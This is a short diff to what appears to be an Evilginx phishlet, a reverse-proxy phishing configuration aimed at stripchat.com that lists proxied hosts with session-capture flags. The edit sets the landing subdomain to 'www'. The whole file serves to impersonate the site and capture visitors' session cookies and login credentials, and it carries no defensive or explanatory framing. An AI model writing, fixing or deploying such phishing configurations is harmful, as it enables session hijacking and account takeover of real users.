@@ -13,7 +13,7 @@
 author: '@mansteve'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: '', orig_sub: '', domain: 'stripchat.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'stripchat.com', session: true, is_landing: true}
   - {phish_sub: 'assets', orig_sub: 'assets', domain: 'stripchat.com', session: true, is_landing: false}
 
   - {phish_sub: 'api', orig_sub: 'api', domain: 'amplitude.com', session: false, is_landing: false}
